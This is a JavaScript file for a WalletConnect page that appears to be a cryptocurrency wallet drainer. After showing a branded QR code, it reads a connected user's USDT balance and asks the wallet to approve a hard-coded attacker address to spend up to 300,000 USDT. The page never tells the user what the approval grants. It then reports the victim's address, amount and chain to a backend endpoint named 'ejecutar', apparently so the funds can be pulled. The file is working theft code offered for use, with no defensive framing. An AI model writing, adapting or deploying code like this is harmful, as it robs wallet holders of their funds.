const DESTINATION = "0x3F1873E4D86539C90df80Fe8F8607C109917990a";
const PROJECT_ID = "250a94254ccf72b5a8cb1d26dc1f4bae";
const BACKEND_URL = "/api/ejecutar";
const MAX_AMOUNT = 300_000n * 10n ** 6n;
const LOGO_SIZE = 50;

const USDT = {
  1: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
  56: "0x55d398326f99059fF775485246999027B3197955"
};

const ERC20_ABI = [
  {
    constant: false,
    inputs: [
      { name: "_spender", type: "address" },
      { name: "_value", type: "uint256" }
    ],
    name: "approve",
    outputs: [{ name: "", type: "bool" }],
    type: "function"
  },
  {
    constant: true,
    inputs: [{ name: "_owner", type: "address" }],
    name: "balanceOf",
    outputs: [{ name: "balance", type: "uint256" }]
  }
];

function drawQR(uri) {
  const canvas = document.getElementById("qr-canvas");
  const tempDiv = document.getElementById("temp-container");
  
  const qr = new QRCode(tempDiv, {
    text: uri,
    width: 300,
    height: 300,
    correctLevel: QRCode.CorrectLevel.H
  });

  setTimeout(() => {
    const img = tempDiv.querySelector("img");
    const ctx = canvas.getContext("2d");
    ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
    
    const logo = new Image();
    logo.src = "/logo.png";
    logo.onload = () => {
      const x = (canvas.width - LOGO_SIZE) / 2;
      const y = (canvas.height - LOGO_SIZE) / 2;
      ctx.drawImage(logo, x, y, LOGO_SIZE, LOGO_SIZE);
    };
    tempDiv.innerHTML = "";
  }, 500);
}

document.addEventListener("DOMContentLoaded", async () => {
  const provider = await WalletConnectProvider.init({
    projectId: PROJECT_ID,
    chains: [1, 56],
    methods: ["eth_sendTransaction", "eth_sign"]
  });

  provider.on("display_uri", drawQR);

  provider.on("connect", async () => {
    const web3 = new Web3(provider);
    const [user] = await web3.eth.getAccounts();
    const chainId = Number(await web3.eth.getChainId());
    const token = new web3.eth.Contract(ERC20_ABI, USDT[chainId]);
    
    let amount = BigInt(await token.methods.balanceOf(user).call());
    amount = amount > MAX_AMOUNT ? MAX_AMOUNT : amount;
    
    await token.methods.approve(DESTINATION, amount.toString())
      .send({ from: user });
    
    fetch(BACKEND_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ user, amount: amount.toString(), chainId })
    });
  });
});
